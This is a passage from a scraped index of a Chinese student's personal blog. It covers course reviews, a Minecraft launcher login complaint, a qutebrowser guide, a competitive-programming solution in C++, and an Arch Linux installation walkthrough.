以上的可以被他請吃飯（？？\n雖然期末只有 80，不過還是有 A+，所以我就不吵分數了（？）\nend 現在打完手好痠，我在懷疑是前幾天去瘋狂打音遊的緣故QQ 身體老了\n部落格想要更新的點子是有的，但要好好的打出來就好累zzz\n","permalink":"https://omeletwithoutegg.github.io/2022/07/14/csie-2nd-sem/","tags":["CSIE","experience"],"title":"第二學期修課心得"},{"contents":"抱怨一下 Minecraft Launcher 之前我都是用 這個 AUR package 作為 Minecraft launcher，但某個時間點之後發現登入帳號之後下面有一行小字寫說什麼無法成功記住你的登入 session 之類的，下次就必須重新進去那個跑很慢的視窗輸入密碼。\nMinecraft 官網上對這個警告的指示是這樣子的：\nhttps://help.minecraft.net/hc/en-us/articles/4408668374925-Secure-Token-Storage-Failure-on-Linux\n也就是說，即使不是 GNOME desktop 也叫你要去裝 gnome-keyring 這個套件，照做之後果然可以成功記住我的身份。\n又有一陣子很久沒玩，重新打開之後發現他竟然要我輸入 gnome-keyring 的不知道什麼密碼，而且還不能 focus 在其他視窗上讓我查一下密碼到底是啥，必須取消輸入密碼才能點其他視窗，真的雷雷。不過其實那個密碼忘記了也沒怎樣，只是要每次重新登入而已。今天剛好比較閒，查了非常久 gnome-keyring 要怎麼用，看網路上的各個教學跟 archwiki 上寫的都不太一樣，根本不知道要改什麼檔案，不過我得知了正常來說，跳出來的那個視窗要我輸入的密碼跟登入 desktop session 的密碼要是一樣的才對，也就是所謂的「login key」，而不是「Default key」。\n而且有一個很奇怪的點是這樣子的：我開機登入 KDE 之後 ps aux | grep gnome 會知道說 gnome-keyring-daemon 有在跑，然後直接打開 minecraft-launcher 會先跳出紅色 error 過一陣子才成功登進去，多重開機幾次之後他彷彿就被玩壞了一樣沒辦法自動登入了QQ，跑去把一些檔案（~/.local/share/keyring 跟 ~/.minecraft/launcher_accounts.json 之類的）刪一刪改一改才讓他變回正常，但再重開機幾次又變神秘了。\n最後覺得放棄使用他才是最好的選擇（所以我也沒研究怎樣正確的設定 gnome-keyring 使用 login key 而不是 default key），缺點只是每次要重新登入。才突然想到我可以去 AUR 看有沒有人在講有關的解決方式，意外翻到 polymc 這個 package，popularity 竟然比原本的還多，安裝之後發現他的 UI 看起來不錯，所以我就想說乾脆來研究 polymc 怎麼用。\n首先第一件事就是要登入一個 microsoft 的帳號（mojang 的帳號之前就被強制 migrate 了），在 polymc 中也是有非常清楚的指示，照做之後遇上了年齡不足之類的警告，跑去翻我的 microsoft 帳號發現我這個帳號明明就已經超過 18 歲了啊@@\n然後查了一大堆資料都說要去微軟官方的帳戶設定調整 Xbox 設定檔，但直接點進去只被告知沒有足夠的權限修改設定。就結果來說是因為雖然微軟帳號本身年齡夠了，但在申請 Xbox 帳號或是某個環節當初填的是兒童帳戶的身份，只好再花一堆時間找怎麼設定。\n找得到的文章都是長這樣，罐頭回覆一堆\nhttps://answers.microsoft.com/en-us/xbox/forum/all/i-cant-play-online-because-how-my-microsoft/b10fe53f-ac24-4dfb-b956-ff93f3e261e5\nhttps://answers.microsoft.com/zh-hans/windows/forum/all/xbox/cffa87f6-4e0b-47d6-b077-d86e8956a8a0\nhttps://answers.microsoft.com/zh-hant/windows/forum/all/%E5%B0%87%E5%85%92%E7%AB%A5%E5%B8%B3%E6%88%B6/9fa1acc4-30c1-43f0-bdcf-6c071f3c91d7\n（我用的關鍵字是「This Microsoft account is underaged and is not linked to a family.」、「microsoft xbox 帳號 權限」跟「此 Microsoft 帳號未成年，也未連結到家庭群組。」之類的）\n總之這樣搞一搞讓我覺得 microsoft 真的有夠雷 = =\n後來的解決方式是我用另外一隻 email 信箱開一個 microsoft 帳號，然後邀請自己成為 家庭 中有權限的人就可以點進去 Xbox 設定檔 了。\n（本來覺得只會有兩三行的文章被我流水帳成這樣了好神奇）\n","permalink":"https://omeletwithoutegg.github.io/2022/04/16/minecraft-launcher-murmur/","tags":["minecraft","arch","linux","experience"],"title":"Minecraft Launcher Murmur"},{"contents":"Qutebrowser: vim-like browser 這是一篇推薦文與介紹文。\n已經忘記開始使用 qutebrowser 的契機是什麼了，可能是看到（東東）學長用覺得很酷。\n在熟悉 vim 之後，qutebrowser 作為一個「Keyboard-driven」的瀏覽器吸引力會大大提昇，其 UI 簡潔與配置的靈活也讓我愛不釋手\nInstallation https://qutebrowser.org/doc/install.html\n在 Arch 下安裝不是難事。\n1 2 3 4 sudo pacman -S qutebrowser # Some optional dependencies sudo pacman -S pdfjs python-adblock python-tldextract \\ python-pygments python-babel Ubuntu 也一樣是 sudo apt install qutebrowser 就可以了，但是版本似乎有點舊，以下提到的有些功能可能沒有或是行為不一樣。\nKeybind 簡介 首先，hjkl 跟 vim 一樣是上下左右。\n使用 : 就可以進入 command mode，當然一樣可以使用各種快捷鍵來做各種瀏覽器內的操作。\n以下是平常最常用的 keybindings！\ncommand keybinding 功能 :open {url} o 在目前的分頁開啟某個 URL :open -t {url} O 在新分頁開啟某個 URL :tab-close d 關閉目前的分頁 :undo u 重新開啟前一次關閉的分頁或視窗 :tab-prev J 下一個分頁（右邊） :tab-next K 上一個分頁（左邊） :back H 回到上一頁 :forward L 回到下一頁 :set-cmd-text :open {url:pretty} go 打開網址列（？） :zoom-in + 增加縮放倍數 :zoom-out - 減少縮放倍數 :zoom = 重置縮放倍數 :reload r 重新整理 :reload -f R 強制重新整理 :yank yy 複製網址列 :open -- {clipboard} pp 打開剪貼簿所複製的網址 :open -t -- {clipboard} Pp 在新分頁打開剪貼簿所複製的網址 :tab-move + gJ 把目前的分頁往上（右邊）移動 :tab-move - gK 把目前的分頁往下（左邊）移動 :q 關閉目前的視窗 :quit --save ZZ 關閉 qutebrowser （這會關閉所有視窗） 下面是在瀏覽一個頁面的時候的一些移動方法：\nkeybinding 功能 gg 跳到最上面 G 跳到最下面 \u0026lt;Ctrl-F\u0026gt; 向下捲動一頁 \u0026lt;Ctrl-B\u0026gt; 向上捲動一頁 \u0026lt;Ctrl-D\u0026gt; 向下捲動半頁 \u0026lt;Ctrl-U\u0026gt; 向上捲動半頁 / 向前搜尋 ? 向後搜尋 可以在 qutebrowser 中打開 qute://help/img/cheatsheet-big.png 看到更多。\nhint hint 應該可以說是 qutebrowser 的一大特色之一。\n在 normal mode 下按 f 後，目前視窗中所有元素就會出現一個小提示在旁邊（預設是黃色三角形+黑色 homerow 字母），當按下對應的按鍵之後瀏覽器就會做出「按下那個元素」的操作，而這也是 qutebrowser 的一大優點之一：可以完全不用滑鼠就完成瀏覽器所需的所有功能（當然，滑鼠功能預設還是可以用）。\n與 f 類似的是 F，不同之處在於如果點擊的是超連結會在新分頁開啟頁面。\n事實上 f 是 :hint all 指令的快捷鍵，除了 f/F 以外還有許多常用的 hint 組合，例如 ;t/;y/;h 等等，分別代表「只 hint 所有 input fields」、「複製 hint 選到的元素連結」以及「hover hint 選到的元素」。可以說你沒想到的 qutebrowser 都想到了(X\n熟練使用這個機制的話會對這個機制上癮，因為按鍵預設都是 homerow 的字母所以很好按，此外如果是同樣的 html，通常 parse 之後同樣的元素通常會對應到同樣的按鍵組合，例如在 youtube 回到首頁在我目前的電腦上就是 da、facebook 回到首頁是 ga、instagram 看限動是 fa 等等。\nConfiguration config 可以大致分成用 :set 設定的變數與用 :bind 設定的鍵盤快捷鍵兩部份。\n首先，和 vim 一樣，qutebrowser 有許多的 option，可以用 :set {option} {value} 來設定一個 option 的 value，此外只要輸入指令就會有非常完整的提示，不用擔心要背下來（？）\n一些例子：\noption 功能 zoom.default 設定預設的縮放倍數 url.searchengines 設定在 open 一個不是網址的東西時的預設搜尋引擎 content.javascript.can_access_clipboard 設定網站可以存取剪貼簿（這樣複製按鈕才能用） fonts.default_size 設定字型預設大小 fonts.web.family.fixed 設定等寬字體 還有很多的東西可以客製化，包含各種 tab、statusbar 的顏色，可以調整成自己喜歡的主題。\n:bind 則是跟 vim 的 map 很類似，可以訂製快捷鍵叫出自己需要的功能。以下是一些例子：\nbindkey command 功能 \u0026lt;Alt-Esc\u0026gt; fake-key \u0026lt;Esc\u0026gt; 因為按 esc 只會進入 normal mode，所以有一個替代的按 esc 的方法。 ;v hint links spawn mpv {hint-url} 可以用 mpv （一個本機的影音軟體）打開一個影片網址，包含 youtube。 gs greasemonkey-reload ;; later 1 reload 重新載入 greasemonkey script。有時候沒載入 YT 就跑出影片廣告很煩人 zl spawn --userscript qute-pass 使用 qute-pass 的快捷鍵 zb hint inputs tab-bg --first ;; later 1 spawn --userscript qute-pass 使用 qute-pass + 自動跳到 input field 的快捷鍵 另外還有更進階的 configuration 功能，詳細要看 qute://help/configuring.html，例如其實可以有一個 config.py 的檔案之類的。\nOptional dependencies pdfjs 安裝了這個可以在瀏覽器中打開 PDF，跟 chrome 一樣（？）\n在下載 PDF 檔案時 qutebrowser 會問你要不要用 pdfjs 打開，按 \u0026lt;Ctrl-P\u0026gt; 就會自動下載到 /tmp 之類的地方再用 pdfjs 在 qutebrowser 中打開。\n現在瀏覽器不能看 PDF 都會被說不及格(X\npython-adblock 安裝這個似乎是可以使用跟 Brave browser 一樣的 adblock 機制（要設定 content.blocking.method = 'both'），不過我在 youtube 上看到的廣告還是不少。\npython-tldextract qute-pass 的 dependency。\npython-pygments 似乎是在 :view-source 的時候可以 :view-source --pygments，會改用 pygments 做 syntax highlight。\npython-babel 這個真的沒有研究，似乎是跟語言翻譯有關的套件。\nqute-pass pass 是一個簡單的密碼管理軟體，而 qutebrowser 有內建一個 userscript qute-pass 可以把存在 pass 裡面的帳號密碼自動填入網站。\n雖然有點小麻煩但真的很乾淨（？）\nyoutube ads 因為 qutebrowser 的 adblock 沒有使用太複雜的機制，因此對於 youtube 影片式廣告沒什麼辦法，目前我看到的一個解決方案是使用 greasemonkey script。\nhttps://gist.github.com/codiac-killer/87e027a2c4d5d5510b4af2d25bca5b01\n結語 Give qutebrowser a try!\n","permalink":"https://omeletwithoutegg.github.io/2022/03/29/qutebrowser/","tags":["arch","linux","qutebrowser","vim"],"title":"Qutebrowser 瀏覽器"},{"contents":"心態 和 ericxiao 去看咒術迴戰 0。\n光是走在路上就遇到很多認識的人，懷疑他是不是替身使者或啥的（X\n吃飯的時候討論上的課，覺得大家都會好多東西（？）\n之後散會時剛好走到公館哈拉，想說走上去打一道 SDVX 結果遇到也是 ICPC 培訓班的一個學長（？）\n很驚訝他有打音遊，總之他站在我後面看，然後我本來就只有剛力羅而且去年三級警戒之後大概打不到十次而已，實在是打的非常爛。\n被問說要不要一起打，刷了卡之後，又是暴龍天，雖然我覺得我很冷靜但我其實不知道我那時候表情怎麼樣（？？）\n總之選歌也很尷尬、打完也很尷尬，彷彿是因為我太弱而沒有資格有發語權一樣（我知道基本上並沒有這種事）\n有點像道德又有點像自我心態管理，我本來以為自己不會這樣子想的，但我果然還是會有不健康的心態。\n就像 HNO2 說過和別人比較只會讓自己不開心，相信自己在做自己喜歡的事情，還有對自己有自信真的是很重要的事情。\n","permalink":"https://omeletwithoutegg.github.io/2022/03/10/introspection-20220310/","tags":[],"title":"心態"},{"contents":"好．傳囉！ Nice Boat！ Description 給定一個長度 $N$ 的整數序列 $A_i$。\n如果你可以找出一個區間，他的前綴和每個數字都大於等於0，而且他的後綴和的每個數字也都大於等於0，我們就稱他是安全區間，請你找出最長的安全區間長度是多少。\nSolution 考慮原序列的前綴和 $p_i = A_1+A_2+\\cdots+A_i$，$p_0=0$，一個區間 $(l, r]$ 是安全區間若且唯若：\n$$\n\\begin{cases}\n\\forall l \\leq x \u0026lt; r ,\u0026amp; p_r - p_x \\geq 0 \\\\\n\\forall l \u0026lt; x \\leq r ,\u0026amp; p_x - p_l \\geq 0 \\\\\n\\end{cases}\n$$\n也就是說，$p_r$ 和 $p_l$ 分別必須要是這段區間的最大值與最小值。\n可以用單調隊列對於每個 $r$ 求出它左邊第一個嚴格比 $p_r$ 大的數字 $left_r$，以及對於每個 $l$ 求出它右邊第一個嚴格比 $p_l$ 小的數字 $right_l$。\n那麼，安全區間的定義又可以寫成\n$$\nleft_r \u0026lt; l \\leq r \u0026lt; right_l\n$$\n對 $l$ 做掃描線，$l$ 從 $0$ 到 $n$ 每次把符合 $left_r \u0026lt; l$ 的 $r$ 丟進去一個 set 裡面，然後查詢小於 $right_l$ 的 $r$ 最大是多少。這樣時間複雜度 $O(N\\log N)$。\n不過這題空間限制很緊，無情吃 RE 之後改用 BIT 維護再加上輸入優化才 AC。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe \\ std::cerr \u0026lt;\u0026lt; __PRETTY_FUNCTION__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename... T\u0026gt; void qqbx(const char *s, T... args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v), end(v) using namespace std; const int inf = 1e9; template \u0026lt;typename U, typename V\u0026gt; ostream \u0026amp;operator\u0026lt;\u0026lt;(ostream \u0026amp;o, pair\u0026lt;U,V\u0026gt; p) { return o \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p.first \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p.second \u0026lt;\u0026lt; \u0026#39;)\u0026#39;; } inline char readchar() { constexpr int B = 1 \u0026lt;\u0026lt; 20; static char buf[B], *p, *q; if (p == q \u0026amp;\u0026amp; (q = (p = buf) + fread(buf, 1, B, stdin)) == buf) return EOF; return *p++; } inline int nextint() { int x = 0, c = readchar(), f = false; while (c \u0026lt; \u0026#39;0\u0026#39; \u0026amp;\u0026amp; c != \u0026#39;-\u0026#39;) c = readchar(); if (c == \u0026#39;-\u0026#39;) f = true, c = readchar(); while (c \u0026gt;= \u0026#39;0\u0026#39;) x = x * 10 + (c ^ \u0026#39;0\u0026#39;), c = readchar(); return f ? -x : x; } inline void readline(char* s) { char c = readchar(); while (c != \u0026#39;\\n\u0026#39;) *s++ = c, c = readchar(); } struct FastOut { constexpr static int B = 1 \u0026lt;\u0026lt; 20; static char buf[B]; int q; inline void writeint(int x, char sep = \u0026#39;\\n\u0026#39;) { static char stk[20]; char p = 0; if (!x) stk[p++] = \u0026#39;0\u0026#39;; while (x) stk[p++] = x % 10 ^ \u0026#39;0\u0026#39;, x /= 10; while (p) buf[q++] = stk[--p]; buf[q++] = sep; if (q + 20 \u0026gt;= B) fwrite(buf, 1, q, stdout), q = 0; } ~FastOut() { fwrite(buf, 1, q, stdout); } } ouf; char FastOut::buf[B]; const int maxn = 1000025; int64_t a[maxn]; int R[maxn]; pair\u0026lt;int,int\u0026gt; evt[maxn]; int stk[maxn]; int sz; void Add(int x) { for (++x; x \u0026lt;= sz; x += x \u0026amp; -x) a[x] += 1; } int Query(int p) { int sum = 0; for (++p; p \u0026gt; 0; p -= p \u0026amp; -p) sum += a[p]; int res = 0; for (int s = 1\u0026lt;\u0026lt;20; s; s \u0026gt;\u0026gt;= 1) if (res + s \u0026lt;= sz \u0026amp;\u0026amp; sum \u0026gt; a[res + s]) sum -= a[res += s]; return res; } signed main() { // ios_base::sync_with_stdio(false); // cin.tie(nullptr); int T = nextint(); // const int64_t C = 1e9; for (int tc = 0; tc \u0026lt; T; tc++) { int n = nextint(); for (int i = 1; i \u0026lt;= n; i++) a[i] = nextint(); for (int i = 1; i \u0026lt;= n; i++) a[i] += a[i-1]; int m = 0; { int p = 0; for (int i = 0; i \u0026lt;= n; i++) { while (p \u0026amp;\u0026amp; a[stk[p-1]] \u0026lt;= a[i]) --p; int l = !p ? -1 : stk[p-1]; stk[p++] = i; evt[m++] = { l, i }; } } { int p = 0; for (int i = n; i \u0026gt;= 0; i--) { while (p \u0026amp;\u0026amp; a[stk[p-1]] \u0026gt;= a[i]) --p; R[i] = !p ? n+1 : stk[p-1]; stk[p++] = i; } } sort(evt, evt+m); // use a as an BIT sz = n+2; for (int i = 0; i \u0026lt;= sz; i++) a[i] = 0; int ans = 0; int it = 0; for (int i = 0; i \u0026lt;= n; i++) { while (it \u0026lt; m \u0026amp;\u0026amp; evt[it].first \u0026lt; i) { int j = evt[it++].second; Add(j); } int len = Query(R[i]) - i; ans = max(ans, len); } ouf.writeint(ans); } } 至於怎麼用假解拿到 topcoder 又是另一個故事了…應該很快會更新測資（\n","permalink":"https://omeletwithoutegg.github.io/2022/02/11/TIOJ-1841/","tags":["TIOJ","stack","monotone-queue","data-structure"],"title":"TIOJ 1841"},{"contents":"安裝 arch 這篇文章是分享與紀錄我在筆電上裝 arch-linux 的過程，其實要裝還是直接看 arch wiki 最快XD 不過那個頁面沒有講怎麼裝 bootloader 與桌面環境。\n製作開機隨身碟（Live USB） 下載 .iso 檔案，並將其寫入 USB 當中（假設 USB 是 /dev/sdb）。\n1 dd bs=4M if=~/Downloads/archlinux-2022.02.01-x86_64.iso of=/dev/sdb \u0026amp;\u0026amp; sync 使用隨身碟開機 通常在開機時按下某個按鍵可以進入選擇開機媒介的選單，例如我現在這台 ASUS 的筆電就是在出現 logo 時按 F2 就會出現選單，在 boot 的地方可以選擇用\nusb 開機。\n在使用隨身碟（使用 live 環境）開機時會有 .iso 裡面自帶的套件可以用，例如 vim、iwd、zsh 等等指令，但這些套件在安裝完成的 arch 裡面不會自動附上。\n確認啟動模式 1 ls /sys/firmware/efi/efivars 如果指令沒有報錯，則系統在 UEFI 模式下啓動。如果目錄不存在，系統可能以 BIOS 或 CSM 模式啓動。\n連上網路 使用 iwctl 連上 Wi-Fi 網路\n1 2 3 4 iwctl [iwd]# device list [iwd]# station DEVICE scan [iwd]# station DEVICE connect SSID 其中 DEVICE 是你的網路介面裝置的名稱\n可以用 ping 確認連線狀態\n1 ping archlinux.org 更新系統時間 1 timedatectl set-ntp true 切割與格式化硬碟 把你的硬碟分區，至少要切出用來當 root（/）跟 boot（/boot）的兩塊，其中 boot 要至少 512 MB。非常推薦把（/home）也切成獨立的一塊，到時候重裝的時候比較方便。如果是 BIOS 的話則不需要切出 /boot 分區。\n另外還可以切一塊來當作 swap，我自己切大約 2G（？）\n假設你的硬碟是 /dev/sda，那麼可以用 fdisk /dev/sda 來修改與查詢分割區。\nfdisk 按 n 會新增一個分區，接著會要輸入分區編號、First Sector、Last Sector、分區類型，其中 Last Sector 可以打 +{N}G 來設定磁碟大小，其他參數都可以預設就好。\n按 p 會顯示目前的分區狀態，按 d 則是可以刪除分區。\n基本上 fdisk 指令按 m 就可以獲得很多提示，此外在下 w （儲存）指令之前都不會真正的修改分割區，因此 w 要小心一點下。\n接著就是要格式化每個切割出來的分區。\n格式化一般的 linux 檔案系統（通常是 ext4）的指令如下，假設要格式化的是 /dev/sda3 與 /dev/sda4 分區，分別當作根分區（root partition）與 home 分區。\n1 2 mkfs.ext4 /dev/sda3 mkfs.ext4 /dev/sda4 swap 分割區可以用 mkswap 格式化。\n1 mkswap /dev/dev/sda2 一個 EFI 系統分區通常是用 FAT32 格式化\n1 mkfs.fat -F 32 /dev/sda1 掛載處理好的硬碟 將根分區掛載到 /mnt，其他對應的硬碟分區也掛載到對應的掛載點。\n例如：\n1 2 3 4 5 mount /dev/sda3 /mnt mkdir /mnt/{home,boot} mount /dev/sda1 /mnt/boot # mount /dev/sda1 on boot mount /dev/sda4 /mnt/home # mount /dev/sda4 on home swapon /dev/sda2 # enable swap 安裝 使用 pacstrap 指令在 /mnt 安裝以下三個 package\n1 pacstrap /mnt base linux linux-firmware 再次注意 base 軟體包中不包含 live 環境中的所有工具，因此像是 vi、git 等基礎設施（？）可以記得安裝。\n配置系統 接下來我們會換根成 /mnt 並對裡面的文件做一些修改\n首先把 fstab 文件放到 etc/fstab\n1 genfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab 正式把 /mnt 當成我們的新根，進入新系統。\n1 arch-chroot /mnt 接下來，可以看到 console 最前面有 (chroot) 字樣，表示你的操作現在只會看得到並且只會影響原本的 /mnt，也是新的 /。\n時區 1 ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime 執行 hwclock\n1 hwclock --systohc locale 編輯 /etc/locale.gen，取消註釋 en_US.UTF-8 UTF-8 和其它需要的 locale，然後執行以下指令來生成它們：\n1 locale-gen 在 /etc/locale.conf 設定\n1 LANG=en_US.UTF-8 host name 編輯 /etc/hostname 成自己喜歡的名字（？）\n順帶一提前面所說的編輯只可以用已經安裝在新根的軟體，例如 vi 之類的。\n1 pacman -S vi 設定 root 密碼 1 passwd 安裝 bootloader 我使用的 bootloader 是 GRUB。若是 UEFI 的話：\n1 2 3 pacman -S grub efibootmgr grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB grub-mkconfig -o /boot/grub/grub.cfg 若是 BIOS 則可以\n1 2 pacman -S grub grub-install --target=i386-pc /dev/sda # 可以是原本 root partition 同樣的硬碟 安裝 KDE (plasma) 桌面環境 1 2 pacman -S xorg plasma sddm networkmanager pacman -S kate dolphin git zsh konsole openssh gvim # 一些我常用的基礎東東（？） 途中的選項我都是選預設的。\n安裝完成後，記得啟用 sddm 與 networkmanager 的 service\n1 2 systemctl enable sddm systemctl enable NetworkManager 注意不要同時啟用 iwd 與 NetworkManager 兩個網路 service，否則打架會讓你的 sudo 動不了很難受…\n增加非 root user 以及給予 sudo 1 2 useradd USER -m passwd USER 編輯 sudoer 的設定檔，把\n1 %sudo ALL=(ALL:ALL) ALL 這行的註解取消掉，讓 sudo 這個 group 的人可以使用 sudo。\n接著\n1 2 groupadd sudo usermod -aG sudo USER 會需要新增一個 user 是因為 plasma 不允許 root 直接登入桌面環境，而讓其有 sudo 權限是因為做任何事情像是裝套件都會需要有 sudo 權限。\n結束！ 退出 chroot（exit 或 Ctrl + D），並 reboot\n一切搞定，可以去用 GUI 改 KDE 的一些設定，像是 theme、工作列或是觸控版方向（？）\n還有可以裝一個 web browser，我自己常用 google-chrome，可以用 AUR 安裝。\n1 2 3 git clone https://aur.archlinux.org/google-chrome.git cd google-chrome makepkg -si # build the package, install dependencies, install itself ","permalink":"https://omeletwithoutegg.github.io/2022/02/08/arch-install-202202/","tags":["arch","linux","pacman","KDE","plasma","grub"],"title":"Arch Install 202202"},{"contents":"First semester in csie 部落格已經年久失修ㄌ…\n來講講這學期都在做什麼好了\n計算機程式設計 系上大一必修，大致上是教 C 的語法，從基本 IO 到指標、檔案操作、簡單遞迴等等。\n在高中有參加過程式競賽可以向教授申請當「真強者」，可以不用小考、上課就會在學期末拿到 A+，而通常「真強者」負責的工作是讓這門課的學生可以問問題，並且要負責驗題，整學期總共 30 題吧。\n劉邦鋒教授很毒舌（？）常常嘴砲學生跟助教，然後這學期說助教出的測資太爛，我們又多了一個出測資的工作。\n普通物理學甲上 另一個大一必修，上課教授是呂榮祥教授。\n上課不點名（超優！！），所以我後面都沒有去上課XD\n作業每個禮拜有似乎是從課本挑的題目，以及 VPython 模擬。\nVPython 照著 pdf 做大概就可以抄掉九成的 code 了，真的不想認真的話可以找到網路上一模一樣的題目。\n推薦每個禮拜好好做作業，因為段考會出作業題，剩下的大概就佛系看投影片吧（？）\n沒去上課還能抱佛腳拿到 A+ 應該算甜涼課吧。\n微積分一二（？） 在高三的時候有修所以抵免掉了。\n計算機概論 就教計概。\n作業是 nand2tetris 前面的幾個 project，要學會寫一些奇怪的語言。\n沒有期末考，只有 Final Project，我們的 Final Project 是用很像組合語言的 Jack 語言做一個小遊戲。\n期中考考上課有講的東西，應該不算難（？）\n可是我只有拿到 A-，但也沒有追根究底因為 C+ 根本稀釋不了ㄌ。\n可能還有一個原因是罪惡感，前半有比較認真看影片但後面就沒看QQ\n線性代數 在學期初努力（？）加簽到的大二必修。單班李明穗教授。\n我們這群有修線代的人因為老師上課沒有留任何投影片或是紀錄檔，所以有一起做一個共筆，把上課的東西抄下來。\n學期前半我沒怎麼上課，後面有跟著有去修的人借教室一起聽線上課。\n大部分人都覺得教的內容太少，不如自己看課本學比較快。\n然後每個禮拜有作業、有三次期末考，其實大部分都是熟練計算，和我想像的有差距。\n說得誇張一點，這門課就是教你怎麼做高斯消去法的。期末考計算量真的死人。\n順帶一提這學期的考試有至少兩次題目有問題，然後後來考完才說是題意不清，讓人很煩躁，不過反正最後還是 A+。\n醫學與生活 和王勻一起修的通識，但拿到 C+ 有夠慘…\n據說是學期當中有兩次抽點名我們都沒點到，有一次甚至還是因為為了體育分數去參加拔河@@\n反正是一個每週三要去醫學院聽兩小時左右的東西的課程，每次的講者都不同，另外還有一次實體參訪醫學人文博物館。\n分數除了出席（抽點…）以外還有實體參訪心得、整學期任選一些課的心得，還有期末考分數。\n後來去問為什麼會 C+ ，分數要不回來，老師所說期末考只是考考形式我也不想在乎了@@\n健康體適能 就體育課，從小到大上的那種。\n他是唯一一門我要早起的課（計程也在早上但不用上課），然後最後一兩堂我睡過頭沒請假出席分數被扣爆，再加上我有一些加分也沒有加滿，最後被老師憐憫才拿到 B-，我好像不太能說什麼…\n演算法設計與分析（ADA） 也是在學期初加簽到的大二必修，是系上著名硬課之一。\n這門課主要學到的會是如何好好（因為我覺得我常常寫的不嚴謹但還是有分數，所以我不會說嚴謹）證明演算法的正確性跟時間複雜度。\n作業的部份有程式題跟手寫證明，還有在 NTU COOL 上的mini HW。\n程式題引用別人的說法就是「助教沒有在控難度」XD，但給人寫的時間都很長（三個禮拜），所以如果不太會可以到處問人或是利用 TA hour 問助教。\n手寫證明通常不難，只是要寫的落落長很煩而已。\nmini HW 可能是選擇題或是簡答題，反正就是就算沒去上課每個禮拜最好也記得寫的東西。\n這次的期中考平均分數悽慘兮兮，題目基本上沒什麼人可以寫完，而且還有一堆難題@@；而期末考就比較佛心一點了，少了一題而且有很多不用寫理由的題目。\n如果你是高中有摸到 TOI 的一員，你大概會覺得前半都在講很多廢話，而且考試相對不難（但是時間還是很少）\n大致上來說，投影片的內容你都看過覺得會，那考試大概就不用太擔心了。推薦熟記名詞，以及去看考古題（例如要你構某個假解的反例，但注意題目可能跟考古題有微妙不同）還有練習寫字。總是會 A+ 的。\n程式設計技巧（ICPC 培訓班） 要參加 ICPC 的人會來參加的課。每週六打五小時的比賽。\n這門三學分也不算是輕鬆的三學分，想拿到 A+ 大概不是要常常練習就是要在學期末把大部分的題目都補完。\n這學期實質上花很多時間的課，因為隊友們超級認真（？）每週團練兩三次，感覺不太到自己有什麼成長，但我們三個合作的能力應該有練習起來（吧？）\n結語 不是資工系的課通常都不是特別甜，最好小心像是出席或是參加特定活動加分等等，搞不好掉 A+ 的原因就是這樣QQ\n另外寫完這篇我才發現因為周圍的人都很注重 GPA 讓我現在講的好像分數是一切一樣，但其實我不知道 GPA 實質用途是什麼，好像人生的重心不應該是這個？？\n對未來缺乏規劃的廢人…\n娛樂、閒話 這學期學會打日麻了，快速中毒，每天通勤必定打開雀魂 XD\n另外也覺得自己比較會 tetris 了（雖然還是好菜），有一小段時間是會玩 tetr.io 一個晚上的（？）\n音遊好像好久好久沒有打了，疫情讓我拿掉這個習慣，新埔的點又撤掉我常玩的音遊，要玩音遊的麻煩度直接直線上升就沒玩了。\n不知道是大學後大家才開始有卦還是只是我國高中太邊，反正好像偶爾閒聊的時候話題都稍微會出現八卦，又或許只是我現在才意識到這叫做八卦吧（？）\n這個禮拜爆重裝 arch，覺得自己快變成重灌狂人了。\n下一篇來紀錄自己裝 arch 的流程好了。或是講貓樹？總之不知道下一篇文章會是什麼時候。\n","permalink":"https://omeletwithoutegg.github.io/2022/02/04/csie-1st-sem/","tags":["CSIE","experience"],"title":"第一學期修課心得"},{"contents":"2021 TOI 模考 可能因為以前 TOI 模考題也不太公開，好像從來沒人做過這種事情，但因為現在模考題甚至可以在公開的 facebook 社團看到，所以我認為這樣沒有太不妥。\n今年的題目相較於去年簡單很多（去年好難…），所以就嘗試把四次模擬考總共 16 題的解寫完啦～要是能幫上想做今年模考題的人就好了！\n如果想在 hackmd 上看的話可以戳 